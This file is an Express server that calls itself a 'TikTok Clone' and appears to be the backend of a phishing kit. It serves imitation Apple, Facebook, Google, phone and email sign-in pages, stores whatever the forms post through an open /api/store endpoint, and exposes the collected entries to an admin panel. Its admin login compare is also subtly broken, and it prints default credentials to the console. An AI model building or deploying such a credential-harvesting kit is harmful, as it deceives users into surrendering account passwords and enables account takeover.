const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

// ── Admin credentials (change these!) ──────────────────────
const ADMIN_USERNAME = process.env.ADMIN_USER || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'admin123';

// ── Facebook display name ──────────────────────────────────
const FB_NAME = process.env.FB_NAME || 'John Smith';

// ── Token store (in-memory, resets on restart) ─────────────
const activeTokens = new Set();

function generateToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve all static files from the current directory
app.use(express.static(path.join(__dirname, 'public')));

// Route map — clean URLs
const routes = {
  '/':                  'login.html',
  '/login':             'login.html',
  '/signup':            'signup.html',
  '/login/phone':       'login-phone.html',
  '/login/email':       'login-email.html',
  '/signup/phone':      'signup-phone.html',
  '/signup/email':      'signup-email.html',
  '/auth/apple':        'apple-signin.html',
  '/auth/apple/verify': 'apple-password.html',
  '/auth/facebook':     'facebook-auth.html',
  '/auth/facebook/login': 'facebook-login.html',
  '/auth/google':       'google-signin.html',
};

Object.entries(routes).forEach(([route, file]) => {
  app.get(route, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', file));
  });
});

// ── Admin login page ───────────────────────────────────────
app.get('/admin/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

// ── Admin login API ────────────────────────────────────────
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;

  // Constant-time compare to prevent timing attacks
  const userMatch = crypto.timingSafeEqual(
    Buffer.from(username || ''),
    Buffer.from(ADMIN_USERNAME)
  );
  const passMatch = crypto.timingSafeEqual(
    Buffer.from(password || ''),
    Buffer.from(ADMIN_PASSWORD)
  );

  if (userMatch && passMatch) {
    const token = generateToken();
    activeTokens.add(token);
    // Auto-expire token after 2 hours
    setTimeout(() => activeTokens.delete(token), 2 * 60 * 60 * 1000);
    return res.json({ success: true, token });
  }

  res.status(401).json({ success: false, message: 'Invalid username or password' });
});

// ── Admin logout API ───────────────────────────────────────
app.post('/api/admin/logout', (req, res) => {
  const token = (req.headers.authorization || '').replace('Bearer ', '');
  activeTokens.delete(token);
  res.json({ success: true });
});

// ── Token verification API ─────────────────────────────────
app.get('/api/admin/verify', (req, res) => {
  const token = (req.headers.authorization || '').replace('Bearer ', '');
  if (activeTokens.has(token)) {
    return res.json({ valid: true });
  }
  res.status(401).json({ valid: false });
});

// ── Admin dashboard (redirect to login if no token) ────────
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// ── Protected API middleware ───────────────────────────────
function requireAdmin(req, res, next) {
  const token = (req.headers.authorization || '').replace('Bearer ', '');
  if (activeTokens.has(token)) return next();
  res.status(401).json({ error: 'Unauthorized' });
}

// ── Public config API ─────────────────────────────────────
app.get('/api/config/fb-name', (req, res) => {
  res.json({ name: FB_NAME });
});

// ── Data API (protected) ──────────────────────────────────
app.post('/api/store', (req, res) => {
  const entry = { ...req.body, timestamp: new Date().toISOString() };
  let data = [];
  if (fs.existsSync(DATA_FILE)) {
    try { data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) { data = []; }
  }
  data.push(entry);
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  res.json({ success: true });
});

app.get('/api/data', requireAdmin, (req, res) => {
  if (!fs.existsSync(DATA_FILE)) return res.json([]);
  try { res.json(JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'))); }
  catch (e) { res.json([]); }
});

app.get('/api/clear', requireAdmin, (req, res) => {
  if (fs.existsSync(DATA_FILE)) fs.unlinkSync(DATA_FILE);
  res.json({ success: true });
});

// 404
app.use((req, res) => {
  res.redirect('/');
});

app.listen(PORT, () => {
  console.log(`\n  TikTok Clone running at http://localhost:${PORT}\n`);
  console.log('  Routes:');
  Object.entries(routes).forEach(([r, f]) => {
    console.log(`    http://localhost:${PORT}${r.padEnd(24)} → ${f}`);
  });
  console.log(`    http://localhost:${PORT}/admin                  → admin.html (🔒 protected)`);
  console.log(`    http://localhost:${PORT}/admin/login             → admin-login.html`);
  console.log(`\n  Admin credentials: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}\n`);
});
